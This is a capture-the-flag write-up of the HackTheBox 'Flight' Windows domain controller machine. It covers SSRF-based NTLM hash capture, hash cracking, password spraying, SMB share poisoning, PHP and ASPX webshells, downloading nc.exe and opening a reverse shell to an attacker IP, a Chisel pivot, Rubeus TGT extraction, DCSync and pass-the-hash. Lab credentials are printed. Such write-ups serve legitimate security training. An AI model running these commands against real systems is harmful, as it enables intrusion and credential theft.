---
title: "HTB Flight"
date: 2025-10-21
difficulty: Hard
platform: HackTheBox
os: Windows
tags:
  - Active-Directory
  - SSRF
  - NTLM-Theft
  - Password-Spraying
  - Virtual-Accounts
  - Kerberos
  - DCSync
  - Privilege-Escalation
summary: "Flight is a Hard-difficulty Windows machine featuring a Domain Controller with multiple web services. The attack chain involves SSRF exploitation to capture NTLM hashes, password spraying, SMB share poisoning with desktop.ini files, PHP/ASPX webshell deployment, and a unique privilege escalation through IIS Virtual Accounts running as the machine account. The final stage leverages Rubeus to extract a TGT and perform a DCSync attack to compromise the domain."
---

## TL;DR

Flight demonstrates a multi-stage attack against a Windows Domain Controller running web services. Initial access is gained through SSRF exploitation on a virtual host to leak NTLM credentials. After cracking the hash and gaining write access to an SMB share, NTLM theft techniques using malicious desktop.ini files compromise another user. Web shell deployment through PHP and ASPX provides code execution, leading to the discovery of IIS running under a Virtual Account with machine account privileges. This configuration allows extracting a TGT for the Domain Controller computer account and performing a DCSync attack to obtain the Administrator's NTLM hash.

---

## Reconnaissance

### Port Scanning

Starting with an Nmap scan to identify available services:

```bash
nmap -sC -sV -p- flight.htb -oN nmap_full.txt
```

The scan reveals a typical Domain Controller setup with HTTP services:

- **53/tcp** - DNS
- **80/tcp** - HTTP (Apache httpd 2.4.52)
- **88/tcp** - Kerberos
- **135/tcp** - MSRPC
- **139/tcp** - NetBIOS-SSN
- **389/tcp** - LDAP
- **445/tcp** - SMB
- **464/tcp** - kpasswd5
- **593/tcp** - MSRPC over HTTP
- **636/tcp** - LDAPS
- **3268-3269/tcp** - Global Catalog
- **5985/tcp** - WinRM
- **9389/tcp** - Active Directory Web Services

### Initial Enumeration

Standard enumeration of LDAP, SMB, and RPC with null authentication yielded no results, so focus shifted to the HTTP service.

### Virtual Host Discovery

Even though the server at `flight.htb` doesn't redirect to a domain, virtual host enumeration was attempted:

```bash
ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /path/to/wordlist -fs 7069
```

![VHost Discovery](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170110.png)

This discovered the virtual host `school.flight.htb`, which was added to `/etc/hosts`.

---

## Initial Access

### SSRF Vulnerability

Exploring `school.flight.htb` revealed a parameter vulnerable to Server-Side Request Forgery (SSRF). This vulnerability can be exploited to force the server to authenticate to an attacker-controlled resource, leaking NTLM credentials.

![SSRF Parameter](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170146.png)

Setting up Responder to capture the authentication attempt:

```bash
responder -I tun0
```

![Responder Listening](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170205.png)

Triggering the SSRF by requesting a UNC path pointing to the attacker's machine:

```
http://school.flight.htb/vulnerable_param?file=\\10.10.14.5\share
```

![NTLM Hash Captured](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170221.png)

The captured NTLMv2 hash was cracked using hashcat:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hash Cracked](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021170233.png)

**Compromised Credentials:** `svc_apache:S@Ss!K@*t13`

---

## Lateral Movement

### SMB Enumeration

With valid credentials, SMB shares were enumerated:

```bash
nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
```

![SMB Shares](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214113.png)

**Available Shares:**
- **Shared** - Empty share (WRITE access)
- **Web** - Root directory for `flight.htb` and `school.flight.htb`
- **Users** - Standard `C:\Users` directory

### Password Spraying

Since `svc_apache` was likely created specifically to run Apache, the password might have been reused for other service accounts:

```bash
nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

![Password Spray](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214327.png)

Only `svc_apache` had this password, but the user now has WRITE access to the `Shared` SMB share.

### NTLM Hash Theft via SMB

Given write access to `Shared`, and assuming other users access this share, malicious files that trigger automatic NTLM authentication can be planted. The tool [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) generates various file types for this purpose:

```bash
python3 ntlm_theft.py -g all -s 10.10.14.5 -f shared_files
```

![NTLM Theft Files](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021205646.png)

Uploading all generated files to the SMB share:

```bash
smbclient //flight.htb/Shared -U 'svc_apache%S@Ss!K@*t13'
smb: \> mput *
```

![Files Uploaded](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214830.png)

With Responder still running, another user's NTLM hash was captured:

![Hash Leaked](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021205703.png)

The hash was cracked:

![Hash Cracked Again](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021214929.png)

**Compromised Credentials:** `c.bum:Tikkycoll_431012284`

### User Flag

Retrieved the user flag via SMBClient:

```bash
smbclient //flight.htb/Users -U 'c.bum%Tikkycoll_431012284'
smb: \> cd c.bum\Desktop
smb: \> get user.txt
```

![User Flag](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021215042.png)

---

## Privilege Escalation

### Web Shell Deployment

The user `c.bum` has WRITE access to the `Web` share. A PHP webshell was uploaded:

```bash
smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284'
smb: \> put webshell.php
```

Accessing the webshell at `http://flight.htb/webshell.php?cmd=whoami` confirmed code execution as `svc_apache`.

Creating a temporary directory and uploading `nc.exe`:

```bash
# Via webshell
cmd=mkdir C:\temp
cmd=powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\temp\nc.exe"
```

Catching a reverse shell:

```bash
# On attacker machine
nc -lvnp 4444

# Via webshell
cmd=C:\temp\nc.exe 10.10.14.5 4444 -e cmd.exe
```

### Internal Service Discovery

With an interactive shell, further enumeration revealed an HTTP service on localhost:8000:

```powershell
netstat -ano | findstr LISTEN
```

Testing the service:

```powershell
curl http://localhost:8000
```

The response confirmed an IIS web server. Checking `C:\inetpub` revealed:

```powershell
dir C:\inetpub\development
```

This directory serves as the web root for the IIS service on port 8000.

### Port Forwarding with Chisel

To access the internal web service, Chisel was used for port forwarding:

```bash
# On attacker machine
./chisel server -p 9999 --reverse

# On target (via webshell or reverse shell)
C:\temp\chisel.exe client 10.10.14.5:9999 R:socks
```

Configured proxychains to access `http://localhost:8000` through the SOCKS proxy.

### ASPX Webshell Upload

Attempting to upload an ASPX webshell as `svc_apache` failed due to insufficient permissions. However, `c.bum` is a member of the `WebDevs` group, suggesting he might have the necessary permissions.

Using [RunasCs.exe](https://github.com/antonioCoco/RunasCs) to execute commands as `c.bum`:

```bash
# Upload RunasCs.exe
cmd=powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/RunasCs.exe -OutFile C:\temp\RunasCs.exe"

# Upload ASPX webshell as c.bum
C:\temp\RunasCs.exe c.bum "Tikkycoll_431012284" "powershell -c \"Invoke-WebRequest -Uri http://10.10.14.5/webshell.aspx -OutFile C:\inetpub\development\webshell.aspx\""
```

![RunasCs Upload](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021211722.png)

Verifying the upload:

![ASPX Webshell](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021211736.png)

Accessing the webshell via the SOCKS proxy at `http://localhost:8000/webshell.aspx` and obtaining a reverse shell provided elevated privileges.

### Virtual Accounts - The Key to Domain Admin

Running `whoami` from the new shell returned:

```
iis apppool\defaultapppool
```

![IIS AppPool User](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021215959.png)

This user is a **Virtual Account**, a special type of account introduced in Windows Server 2008 R2. Virtual accounts don't have their own credentials and instead use the **machine account** credentials for network authentication.

Since this is the Domain Controller, the IIS service is running with the credentials of the **DC machine account** (`G0$`).

![Virtual Account Info](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220105.png)

### Extracting the TGT with Rubeus

Using [Rubeus](https://github.com/GhostPack/Rubeus), a TGT (Ticket Granting Ticket) for the DC machine account can be extracted:

```bash
# Upload Rubeus.exe
C:\temp\Rubeus.exe tgtdeleg /nowrap
```

![Rubeus TGT](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220313.png)

The output is a base64-encoded `.kirbi` ticket.

![TGT Output](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220329.png)

### Converting the Ticket

Save the base64 output to `ticket.b64`, then convert it:

```bash
# Decode base64
cat ticket.b64 | base64 -d > ticket.kirbi

# Convert to ccache format using impacket
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set the ticket for Kerberos authentication
export KRB5CCNAME=ticket.ccache
```

![Ticket Conversion](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220506.png)

### DCSync Attack

With the TGT for the DC machine account, a DCSync attack can be performed to extract the Administrator's NTLM hash:

```bash
impacket-secretsdump g0.flight.htb -k -just-dc-user Administrator -no-pass
```

![DCSync](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220644.png)

**Administrator NTLM Hash:** `[REDACTED]`

### Getting NT AUTHORITY\SYSTEM

Using the Administrator hash for Pass-the-Hash:

```bash
impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_HASH]
```

![Root Shell](https://raw.githubusercontent.com/YuvalMil/Rootinator/obsidian-notes/obsidian-writeups/Attachments/Pasted%20image%2020251021220744.png)

**Root flag obtained!** 🎉

---

## Key Takeaways

1. **Virtual Host Enumeration** - Don't skip vhost enumeration even when there's no domain redirect
2. **SSRF for NTLM Leaks** - SSRF vulnerabilities can be leveraged to capture NTLM hashes
3. **Desktop.ini NTLM Theft** - Write access to SMB shares can be exploited with malicious files
4. **IIS Virtual Accounts** - Understanding Windows service account types is critical
5. **Machine Account Privileges** - Services running as Virtual Accounts use machine credentials
6. **Rubeus TGT Extraction** - Machine accounts can have TGTs extracted for privilege escalation
7. **DCSync with Kerberos** - TGTs can be used for DCSync attacks without needing password hashes

---

## References

- [NTLM Theft Tool](https://github.com/Greenwolf/ntlm_theft)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Virtual Accounts Documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts)
- [DCSync Attack](https://attack.mitre.org/techniques/T1003/006/)

---

**Machine Difficulty:** Hard  
**Author:** Yuval Mil  
**Date Completed:** October 21, 2025
